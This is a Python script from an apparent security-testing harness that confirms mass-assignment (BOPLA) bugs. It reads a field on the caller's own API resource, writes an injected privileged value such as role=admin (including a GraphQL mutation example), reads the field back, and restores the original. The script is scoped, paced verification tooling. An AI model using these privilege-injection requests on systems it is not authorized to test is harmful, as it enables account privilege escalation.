#!/usr/bin/env python3
"""
bopla-confirm.py — the mass-assignment / BOPLA oracle (Grimnir confirmation harness).

Confirms a Broken Object Property Level Authorization (mass assignment) bug with a 3-step
differential on the caller's OWN resource: read the baseline, write the resource with an injected
privileged property, read it back. The property is confirmed mass-assignable only when it was NOT
already the injected value AND the write made it stick — so a field that already held the value, or
that the server silently ignored, is not a false positive.

  bopla-confirm.py --finding-id FINDING-013 --project-dir ~/workspace/prog \
     --method PATCH --url 'https://api/me' --field role --value admin \
     -H 'Authorization: Bearer T'

GraphQL (POST-with-query-body) shape: pass the write and read-back bodies explicitly and let the
differential work the same way — the write is a mutation injecting the privileged input field, the
read-back is a query selecting it:

  bopla-confirm.py --finding-id FINDING-013 --project-dir ~/workspace/prog \
     --method POST --url 'https://api/graphql' --read-method POST --field role --value ADMIN \
     --write-body '{"query":"mutation{updateUser(input:{role:ADMIN}){role}}"}' \
     --read-body  '{"query":"{me{role}}"}' -H 'Authorization: Bearer T'

Verdict (evidence/<id>/bopla.json):
  confirmed     write 2xx AND read-back shows field == injected value AND baseline != injected value.
  negative      the field did not take the injected value (ignored / rejected / server-controlled).
  inconclusive  the write did not return 2xx, OR the baseline already held the injected value (cannot
                attribute the value to our write), OR a read failed.

This is a WRITE to our own resource. the calling harness auto-fires it only as an own-tenant-write lane on a
non-scarce account; otherwise a human runs it with --operator-override. After a write that stuck, the
baseline value is written back (--no-restore to skip); the restore status is in the evidence.
Escalating a confirmed property (role -> admin) into cross-tenant impact is a
separate step. Zero LLM; the verdict is the differential.
"""
import argparse
import json
import os
import re
import subprocess
import sys
from datetime import datetime, timezone

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import _pace  # noqa: E402  RoE pacing around every live request (sibling module)
import egress as _egress  # noqa: E402  the program's egress proxy: every request rides it or refuses

_MISSING = object()   # distinguish "field absent" from "field is null"


def parse_value(s: str):
    """A --value is JSON when it parses (true/123/"x"/{...}), else a bare string. So `--value true`
    injects a boolean and `--value admin` injects the string "admin"."""
    try:
        return json.loads(s)
    except (ValueError, json.JSONDecodeError):
        return s


def _deep_find(node, field):
    """First value of `field` anywhere in a nested dict/list, or _MISSING. Depth-first, stable
    order. Lets a GraphQL read-back ({"data":{"me":{"role":..}}}) resolve without a hardcoded
    wrapper list — the targeted read-back query returns essentially just that object, so the first
    hit is the right one."""
    if isinstance(node, dict):
        if field in node:
            return node[field]
        for v in node.values():
            r = _deep_find(v, field)
            if r is not _MISSING:
                return r
    elif isinstance(node, list):
        for v in node:
            r = _deep_find(v, field)
            if r is not _MISSING:
                return r
    return _MISSING


def extract_field(body_text: str, field: str):
    """The value of `field` in a JSON body (top level, else a common wrapper like data/user/result,
    else anywhere in the tree), or _MISSING. Best-effort and pure. The shallow checks stay first so
    a REST body's top-level field wins over a coincidental deep match."""
    try:
        doc = json.loads(body_text)
    except (ValueError, json.JSONDecodeError):
        return _MISSING
    if isinstance(doc, dict):
        if field in doc:
            return doc[field]
        for wrap in ("data", "user", "result", "account", "profile"):
            inner = doc.get(wrap)
            if isinstance(inner, dict) and field in inner:
                return inner[field]
    return _deep_find(doc, field)


def classify_bopla(write_status: int, baseline, readback, injected) -> tuple[str, str]:
    """Pure verdict from the 3-step differential."""
    if not (200 <= write_status < 300):
        return "inconclusive", f"write did not succeed (status {write_status}) — cannot test persistence"
    if readback is _MISSING:
        return "inconclusive", "could not read the property back after the write"
    if baseline == injected:
        return "inconclusive", ("the property already held the injected value before the write — "
                                "cannot attribute it to mass assignment (pick a value that differs)")
    if readback == injected:
        return "confirmed", (f"property accepted an injected privileged value via mass assignment "
                             f"(baseline {baseline!r} -> {injected!r})")
    return "negative", f"the property did not take the injected value (still {readback!r})"


def _request(method: str, url: str, headers: list[str], body: str | None = None) -> tuple[int, str]:
    cmd = ["curl", "-sS", "-g", "-m", "20", "-o", "-", "-w", "\n__HTTP_%{http_code}__", "-X", method]
    cmd += _egress.curl_args(_egress.proxy())
    for h in headers:
        cmd += ["-H", h]
    if body is not None:
        cmd += ["--data-binary", body]
        if not any(h.lower().startswith("content-type:") for h in headers):
            cmd += ["-H", "Content-Type: application/json"]
    cmd += [url]
    _pace.before(url)
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=30).stdout
    except Exception:
        return 0, ""
    status, rbody = 0, out
    if "\n__HTTP_" in out:
        rbody, _, tail = out.rpartition("\n__HTTP_")
        status = int(tail.replace("__", "").strip() or 0)
        _pace.after(url, status)
    return status, rbody


def restore_baseline(a, baseline, readback, injected) -> dict:
    """Write the baseline back when our write changed the field. Only for the default REST shape: an
    explicit --write-body (GraphQL) has no generic inverse, so it is reported, not attempted."""
    if a.no_restore:
        return {"attempted": False, "why": "--no-restore"}
    if readback is _MISSING or readback != injected:
        return {"attempted": False, "why": "field did not take the injected value; nothing to restore"}
    if baseline is _MISSING:
        return {"attempted": False, "why": "baseline absent from the read model; cannot restore"}
    if a.write_body is not None:
        return {"attempted": False, "why": "explicit --write-body has no generic inverse; restore by hand"}
    status, _ = _request(a.method.upper(), a.url, a.headers, json.dumps({a.field: baseline}))
    _s, body = _request(a.read_method.upper(), a.url, a.headers, a.read_body)
    after = extract_field(body, a.field)
    return {"attempted": True, "status": status,
            "restored": after is not _MISSING and after == baseline}


def main() -> int:
    ap = argparse.ArgumentParser(prog="bopla-confirm.py")
    ap.add_argument("--finding-id", required=True)
    ap.add_argument("--project-dir", required=True)
    ap.add_argument("--method", default="PATCH", help="write verb (PATCH/PUT/POST); default PATCH")
    ap.add_argument("--url", required=True, help="the caller's OWN resource (read- and writable)")
    ap.add_argument("--field", required=True, help="the privileged property to inject")
    ap.add_argument("--value", default="admin", help="the value to inject (JSON if it parses, else string)")
    ap.add_argument("--read-method", default="GET")
    ap.add_argument("--write-body", default=None,
                    help="explicit write payload (e.g. a GraphQL mutation); default is {field: value}")
    ap.add_argument("--read-body", default=None,
                    help="explicit body for the baseline + read-back requests (e.g. a GraphQL query); "
                         "default is no body (a plain REST read)")
    ap.add_argument("-H", "--header", action="append", default=[], dest="headers")
    ap.add_argument("--no-restore", action="store_true",
                    help="leave the injected value in place (default: write the baseline back)")
    a = ap.parse_args()
    _pace.init(a.project_dir)
    _egress.init(a.project_dir)   # roe.json's proxy applies to a CLI run, not just a lane's env

    injected = parse_value(a.value)
    write_body = a.write_body if a.write_body is not None else json.dumps({a.field: injected})
    _bs, base_body = _request(a.read_method.upper(), a.url, a.headers, a.read_body)
    baseline = extract_field(base_body, a.field)
    write_status, _wb = _request(a.method.upper(), a.url, a.headers, write_body)
    _rs, read_body = _request(a.read_method.upper(), a.url, a.headers, a.read_body)
    readback = extract_field(read_body, a.field)

    verdict, why = classify_bopla(write_status, baseline, readback, injected)
    restore = restore_baseline(a, baseline, readback, injected)
    rec = {"schema": 1, "finding_id": a.finding_id, "vuln_class": "bopla",
           "verdict": verdict, "why": why, "ts": datetime.now(timezone.utc).isoformat(),
           "field": a.field,
           "differential": {
               "baseline": None if baseline is _MISSING else baseline,
               "injected": injected,
               "readback": None if readback is _MISSING else readback,
               "write_status": write_status},
           "restore": restore,
           "negative_control": f"baseline/write/read-back differential on the caller's own resource: {why}"}
    d = os.path.join(a.project_dir, "evidence", a.finding_id)
    os.makedirs(d, exist_ok=True)
    json.dump(rec, open(os.path.join(d, "bopla.json"), "w"), indent=2)
    print(json.dumps({k: rec[k] for k in ("finding_id", "verdict", "why")}, indent=2))
    print(f"wrote {d}/bopla.json")
    return 0


if __name__ == "__main__":
    main()
